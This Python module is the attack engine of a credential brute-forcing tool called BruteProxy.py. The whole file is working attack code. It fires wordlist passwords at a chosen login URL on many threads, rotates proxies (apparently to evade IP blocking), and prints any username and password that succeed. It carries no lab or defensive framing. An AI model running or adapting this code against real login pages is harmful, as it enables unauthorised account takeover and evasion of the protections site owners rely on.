from Modules.Rotater import rotater
from Modules.Utilities import utilities
import requests
import json
import re
import linecache
import itertools
import threading
import time
import sys

class colors:
    HEADER = '\033[95m'
    WHITE = '\033[0m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    DARK_CYAN = '\033[90m'

class attacker:

    spinner__done = False

    # prepare dicts
    def prepareDicts(self, wordlistPath):
        # count the lines in wordlist by file_len() utility
        attacker.wordlist_len = utilities.file_len(0, wordlistPath)
        print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "Loaded " + colors.BOLD + str(attacker.wordlist_len) + colors.ENDC + colors.DARK_CYAN + " passwords from file" + colors.ENDC)

    def setup(self, method, custom_request, cookies, threadsCount, proxylooping, proxylist, proxychange):
        attacker.method = method
        attacker.custom_request = custom_request
        attacker.cookies = cookies
        attacker.threadsCount = threadsCount

        attacker.creds_found = False
        attacker.nextPwdLine = 1
        attacker.threads__run = True
        attacker.attack_threads = list()
        attacker.wantsContinue = False

        attacker.threads__pause = False
        attacker.badResponse_counter = 0
        attacker.algDetection_reserve = False

        attacker.susPwds = list()

        attacker.attempt = 1
        attacker.proxylooping = proxylooping
        attacker.proxylist = proxylist
        attacker.proxychange = proxychange

    def spinner(self):
        for c in itertools.cycle(['Ooooooo', 'oOooooo', 'ooOoooo', 'oooOooo', 'ooooOoo', 'oooooOo', 'ooooooO', 'oooooOo', 'ooooOoo', 'oooOooo', 'ooOoooo', 'oOooooo', 'Ooooooo']):
            if attacker.spinner__done:
                break
            sys.stdout.write('\r' + colors.DARK_CYAN + c + colors.ENDC)
            sys.stdout.write(" " + colors.DARK_CYAN + colors.BOLD + "Progress: " + colors.ENDC + colors.DARK_CYAN + str(attacker.nextPwdLine - 1) + "/" + str(attacker.wordlist_len) + colors.ENDC)
            sys.stdout.flush()
            time.sleep(0.1)

    def attack_thread(self, target, username, wordlist, errIdentfier, username_parameter, password_parameter, request_template_raw, cookiesObj, threadNum):
        while attacker.threads__run:
            if attacker.threads__pause:
                time.sleep(0.1)
                continue
            else:
                currentPwdLine = attacker.nextPwdLine
                attacker.nextPwdLine = attacker.nextPwdLine + 1
                attacker.attempt = attacker.attempt + 1

                # check if next password line is present and increase the counter if so
                if currentPwdLine == attacker.wordlist_len:
                    # reached end, set a flag and finish this try
                    attacker.threads__run = False

                # prepare paswords in current try
                password = linecache.getline(wordlist, currentPwdLine).strip()
                # replace variables in template and convert it into dict
                request_template = request_template_raw.replace("$username$", username).replace("$password$", password).replace("$username_parameter$", username_parameter).replace("$password_parameter$", password_parameter)
                currentRequestObj = json.loads(request_template)

                # decide on GET or POST method
                if attacker.method == "post":
                    # decide on proxy or non-proxy access
                    if attacker.proxylooping == "True":
                        # proxylooping enabled, edit request
                        try:
                            currentRequest = requests.post(target, data = currentRequestObj, cookies = cookiesObj, proxies = rotater.currentProxy)
                        except Exception as e:
                            print(colors.OKCYAN + "[" + colors.FAIL + colors.BOLD + "\u2717" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.FAIL + "Fatal error occured while sending the request with proxy: \n" + colors.ENDC + colors.HEADER + e + colors.ENDC)
                            attacker.threads__run = False
                            break
                    else:
                        currentRequest = requests.post(target, data = currentRequestObj, cookies = cookiesObj)
                elif attacker.method == "get":
                    # decide on proxy or non-proxy access
                    if attacker.proxylooping == "True":
                        # proxylooping enabled, edit request
                        try:
                            currentRequest = requests.get(target, data = currentRequestObj, cookies = cookiesObj, proxies = rotater.currentProxy)
                        except Exception as e:
                            print(colors.OKCYAN + "[" + colors.FAIL + colors.BOLD + "\u2717" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.FAIL + "Fatal error occured while sending the request with proxy: \n" + colors.ENDC + colors.HEADER + e + colors.ENDC)
                            attacker.threads__run = False
                            break
                    else:
                        currentRequest = requests.get(target, data = currentRequestObj, cookies = cookiesObj)

                # request sent, let's evalute the response
                currentResponse__text = currentRequest.text
                currentResponse__code = currentRequest.status_code

                if currentResponse__text.find(errIdentfier) == -1 and currentResponse__code < 400:
                    # YAY! we have got the creds, user will be happy!
                    # set a flag
                    attacker.creds_found = True

                    # stop all other threads
                    attacker.threads__run = False
                    rotater.run = False

                    # terminate spinner thread
                    attacker.spinner__done = True
                    print("\r", end = "")

                    # wait till all threads terminate
                    print(colors.OKCYAN + "[" + colors.OKGREEN + colors.BOLD + "\u2713" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "Credentials found, terminating all threads and doing cleanup, please wait..." + colors.ENDC)

                    # greet a user with a great news
                    print(colors.OKCYAN + "[" + colors.OKGREEN + colors.BOLD + "\u2713" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "SUCCESS! Correct credentials were found. Enjoy and thank you for using BruteProxy.py :)" + colors.ENDC)
                    print(colors.OKCYAN + "[] " + colors.ENDC + "     " + colors.BOLD + "Username: " + colors.ENDC + username)
                    print(colors.OKCYAN + "[] " + colors.ENDC + "     " + colors.BOLD + "Password: " + colors.ENDC + password)

                    # before we actaully end loop, if the user has not specified or wrongly specified the error identifier, the very first password will popup
                    # as correct, since it did not find that value in response, so we can theoretically detect that and only inform the user about this
                    if currentPwdLine == 1:
                        print(colors.OKCYAN + "[]" + colors.ENDC)
                        print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "Note that the very first password in wordlist was detected as correct." + colors.ENDC)
                        print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "Please make sure that everything is set up correctly, especially error_identifier and target." + colors.ENDC)
                    # and end loop
                    break
                elif currentResponse__code >= 400:
                    # for future, save this password to dict in case of some detection
                    attacker.susPwds.append(password)

                    # terminate spinner
                    attacker.spinner__done = True
                    print("\r", end = "")

                    if attacker.badResponse_counter > 2 and attacker.wantsContinue == False:
                        # 3 tries were made, stop a loop, reset counter and as the user if he wants to continue even that there is unsuccessful connection with server
                        print(colors.OKCYAN + "[" + colors.FAIL + colors.BOLD + "!" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.FAIL + "Connection with webserver was unsuccessful, getting " + colors.BOLD + str(currentResponse__code) + colors.ENDC + colors.FAIL + " error code.")
                        if utilities.Question(0, "Do you want to continue and complete trying the whole wordlist, even when we're receiving error code?"):
                            # user responded yes, set a wantsContinue flag to true and continue in loop
                            print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "Copy that. Finishing trying the whole wordlist. Error codes will be ignored." + colors.ENDC)
                            attacker.wantsContinue = True
                            attacker.badResponse_counter = 0
                            # reset spinner
                            attacker.spinner__done = False
                            thread__spinner = threading.Thread(target=attacker.spinner, args=(0, ))
                            thread__spinner.start()
                            continue 
                        else:
                            # user responded no, end a loop
                            attacker.badResponse_counter = 0
                            print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "OK. Ending the main loop. Try to check if target parameter is set up correctly." + colors.ENDC)
                            attacker.spinner__done = True
                            return 0                            
                    elif attacker.wantsContinue == False:
                        # we're still trying, increase the counter and print out an info
                        print(colors.OKCYAN + "[" + colors.WARNING + colors.BOLD + "!" + colors.ENDC + colors.OKCYAN + "] " + colors.ENDC + colors.WARNING + "Recived error code " + colors.BOLD + str(currentResponse__code) + colors.ENDC + colors.WARNING + ". Trying again..." + colors.ENDC)
                        attacker.badResponse_counter = attacker.badResponse_counter + 1
                        attacker.spinner__done = False
                        thread__spinner = threading.Thread(target=attacker.spinner, args=(0, ))
                        thread__spinner.start()
                        continue
                else:
                    # this request was unsuccessfull, continue in loop
                    # but firstly, lets pass it through the simple algorithm to detect successful login
                    if attacker.badResponse_counter == 1 and currentPwdLine != 1 and not attacker.algDetection_reserve:
                        attacker.algDetection_reserve = True
                        attacker.threads__pause = True

                        # we was going, then encourted an error and then successfully recovered right after - thats strange and possibly mean that we have found the creds, even without error_identifier!
                        # note that successful passwod was one behind, so load it and question the user
                        possible_pwd = attacker.susPwds[len(attacker.susPwds) - 1]

                        # terminate spinner
                        attacker.spinner__done = True
                        print("\r", end = "")

                        if utilities.Question(0, "Username " + colors.BOLD + colors.DARK_CYAN + username + colors.ENDC + colors.DARK_CYAN + " and password " + colors.BOLD + colors.DARK_CYAN + possible_pwd + colors.ENDC + colors.DARK_CYAN + " were marked as possible, but the system isn't sure. Please try them and let us know. Did these credentials work?"):                      
                            # it worked! print the rest end the loop - exit the function
                            print(colors.OKCYAN + "[" + colors.OKGREEN + colors.BOLD + "\u2713" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "SUCCESS! Correct credentials were found. Enjoy and thank you for using BruteProxy.py :)" + colors.ENDC)
                            print(colors.OKCYAN + "[] " + colors.ENDC + "     " + colors.BOLD + "Username: " + colors.ENDC + username)
                            print(colors.OKCYAN + "[] " + colors.ENDC + "     " + colors.BOLD + "Password: " + colors.ENDC + possible_pwd)

                            attacker.threads__run = False
                            attacker.creds_found = True
                            return 0
                        else:
                            # it didnt work, reset counter and continue in loop
                            attacker.badResponse_counter = 0
                            attacker.algDetection_reserve = False
                            print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "Got it. Continuing main loop... You can stop the attack by Ctrl+C" + colors.ENDC)
                            attacker.spinner__done = False
                            thread__spinner = threading.Thread(target=attacker.spinner, args=(0, ))
                            thread__spinner.start()
                            attacker.threads__run = True
                            attacker.threads__pause = False
                            continue
                    continue

        # terminate the thread after while ends
        return

    def attack(self, target, username, wordlist, errIdentfier, username_parameter, password_parameter):
        # set us some flags, counters and null vars
        attacker.creds_found = False
        attacker.badResponse_counter = 0
        attacker.wantsContinue = False
        attacker.spinner__done = False
        threads_are_dead = False

        # check if user wants custom request, parse it from request.json if so
        if attacker.custom_request == "True" or attacker.custom_request == "true":
            # he wants, error handle loading a file
            try:
                with open('request.json', 'r') as custom_request_json:
                    request_template_raw = custom_request_json.read()
            except:
                print(colors.OKCYAN + "[" + colors.FAIL + colors.BOLD + "!" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.FAIL + "Unable to read request template. Make sure that it is in BruteProxy.py root dir and is named \"request.json\"." + colors.ENDC)
                return 0
        else:
            # he don't want, just set it to default
            request_template_raw = "{\"" + username_parameter + "\": \"$username$\", \"" + password_parameter + "\": \"$password$\"}"

        # check if user wants cookies, parse it from cookies.json if so
        if attacker.cookies == "True" or attacker.cookies == "true":
            # he wants, error handle loading a file
            try:
                with open('cookies.json', 'r') as cookies_json:
                    cookies_template_raw = cookies_json.read()
            except:
                print(colors.OKCYAN + "[" + colors.FAIL + colors.BOLD + "!" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.FAIL + "Unable to read cookies template. Make sure that it is in BruteProxy.py root dir and is named \"cookies.json\"." + colors.ENDC)
                return 0
        else:
            # he don't want, just set it to default
            cookies_template_raw = "{}"

        # firstly, let's generate some dict AND error handle this process, since this is very fishy
        try:
            try:
                attacker.prepareDicts(0, wordlist)
            except:
                # cant read file
                print(colors.OKCYAN + "[" + colors.FAIL + colors.BOLD + "!" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.FAIL + "Can't read wordlist, please make sure that the path is right" + colors.ENDC)
                return

            # last check if there are smaller amount of threads then are passwords
            if attacker.wordlist_len < attacker.threadsCount:
                # there are more threads then passwords available, ask user for intelligent soulution lol
                print(colors.OKCYAN + "[" + colors.WARNING + colors.BOLD + "!" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.WARNING + "There are more threads then available passwords" + colors.ENDC)
                if utilities.Question(0, "Do you want to automatically lower the threads count to the half of the available passwords?"):
                    # user wants to lower the threads to half, do it and continue
                    attacker.threadsCount = attacker.wordlist_len // 2
                    print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "Lowering threads count to " + colors.BOLD + str(attacker.threadsCount) + colors.ENDC + colors.DARK_CYAN + "" + colors.ENDC)
                else:
                    # user doesnt want to lower the count, print and die
                    print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "You can not start an attack that has more threads then available passwords. Attack was unsuccessful." + colors.ENDC)
                    return

            # inform about current numbers of threads
            print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "Running on " + colors.BOLD + str(attacker.threadsCount) + colors.ENDC + colors.DARK_CYAN+ " threads" + colors.ENDC)

            # prepare cookies object
            cookiesObj = json.loads(cookies_template_raw)

            # yay! dict successfully prepared, now let's check one more thing before we get started
            # check if both wordlistcontains atleast 5 items
            if attacker.wordlist_len >= 5:
                # now we're really set up to begin the attack!
                # this process is very fishy too, we must handle that with care
                try:
                    print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.DARK_CYAN + "Executing attack, we'll let you know if we find something... You can stop the attack by Ctrl+C" + colors.ENDC)

                    # start proxy looping thread if user chose it
                    if attacker.proxylooping == "True":
                        try:
                            rotater.setup(0, attacker.proxylist, attacker.proxychange)
                            proxylooping_thread = threading.Thread(target=rotater.rotate, args=(0, ))
                            proxylooping_thread.start()
                            print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.OKCYAN + "Proxy-looping thread has been started." + colors.ENDC)
                        except:
                            attacker.threads__pause = True
                            print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.OKCYAN + "Attack was paused" + colors.ENDC)
                            print(colors.OKCYAN + "[" + colors.WARNING + colors.BOLD + "!" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.WARNING + "Starting proxy-looping thread failed. Entered proxylist file probably doesn't exists." + colors.ENDC)
                            if utilities.Question(0, "Do you want to attack without proxy-looping?"):
                                # user does, proceed
                                print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.OKCYAN + "Attacking without proxy-looping" + colors.ENDC)
                                attacker.proxylooping = "False"
                                rotater.run = False
                                attacker.threads__pause = False
                            else:
                                # he doesnt, die
                                print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.OKCYAN + "Terminating attack" + colors.ENDC)
                                attacker.threads__run = False
                                return

                    # start threads
                    for threadNum in range(1, attacker.threadsCount + 1):
                        attacker.threads__run = True

                        newThread = threading.Thread(target = attacker.attack_thread, args = (0, target, username, wordlist, errIdentfier, username_parameter, password_parameter, request_template_raw, cookiesObj, threadNum, ))
                        attacker.attack_threads.append(newThread)
                        newThread.start()

                    print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.OKCYAN + "All " + colors.BOLD + "" + str(attacker.threadsCount) + colors.ENDC + colors.OKCYAN + " threads has been started and are up" + colors.ENDC)

                    # add spinner as thread (for fun lol)
                    thread__spinner = threading.Thread(target=attacker.spinner, args=(0, ))
                    thread__spinner.start()

                    while attacker.threads__run:
                        # threads are still running, just wait
                        time.sleep(0.1)

                    # make sure all threads are dead
                    while not threads_are_dead:
                        for threadId in range(attacker.threadsCount):
                            if not attacker.attack_threads[threadId].is_alive():
                                threads_are_dead = True
                                continue
                            else:
                                threads_are_dead = False
                                time.sleep(0.1)
                                break
                    
                    # terminate spinner
                    attacker.spinner__done = True
                    print("\r", end = "")

                    print(colors.OKCYAN + "[" + colors.OKBLUE + colors.BOLD + "i" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.OKCYAN + "All attack threads has been terminated and cleanup is done" + colors.ENDC)

                    # reset some flags and counters
                    attacker.wantsContinue = False

                    # if for was unsuccessful and the creds weren't found, print this
                    if not attacker.creds_found:
                        print(colors.OKCYAN + "[" + colors.FAIL + colors.BOLD + "\u2717" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.FAIL + "Credentials were not found in wordlist, we're sorry :(" + colors.ENDC)
                    else:
                        # creds were found, reset the flag, so we will not glitch afterwards
                        attacker.creds_found = False                   
                except:
                    attacker.spinner__done = True
                    print("\r", end = "")
                    print(colors.OKCYAN + "[" + colors.FAIL + colors.BOLD + "!" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.FAIL + "There was an unexpected error in main loop, please make sure that everything is set up correctly" + colors.ENDC)
            else:
                # wordlist too short
                print(colors.OKCYAN + "[" + colors.FAIL + colors.BOLD + "!" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.FAIL + "Wordlist is in wrong format or is too short (it must contain atleast 5 items)" + colors.ENDC)
        except:
            print(colors.OKCYAN + "[" + colors.FAIL + colors.BOLD + "!" + colors.ENDC + colors.OKCYAN + "]" + " " + colors.ENDC + colors.FAIL + "Unexpected error, ensure that everything is set up correctly" + colors.ENDC)
